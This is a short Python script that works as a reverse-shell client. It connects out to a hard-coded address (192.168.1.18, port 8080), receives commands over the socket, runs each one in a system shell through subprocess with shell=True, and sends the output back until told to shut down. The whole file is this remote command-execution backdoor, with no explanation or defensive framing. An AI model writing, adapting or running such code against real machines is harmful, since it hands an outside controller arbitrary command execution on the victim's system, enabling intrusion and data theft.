import socket
import subprocess

HOST = '192.168.1.18'
PORT = 8080
DELIM = '\0'

def get_data(sock):
    while True:
        data = sock.recv(1024)
        if DELIM in data:
            break
        else:
            yield data
    yield data[:-len(DELIM)]

def main():
    sock = socket.socket()
    sock.connect((HOST, PORT))

    while True:
        try:
            cmd = ''.join(get_data(sock))

            if cmd == 'shutdown':
                sock.close()
                break
            else:
                popen = subprocess.Popen(cmd,
                                         shell=True,
                                         stderr=subprocess.STDOUT,
                                         stdout=subprocess.PIPE)
                sock.send((popen.stdout.read() or '\n') + DELIM)
        except KeyboardInterrupt:
            sock.close()

if __name__ == '__main__':
    main()
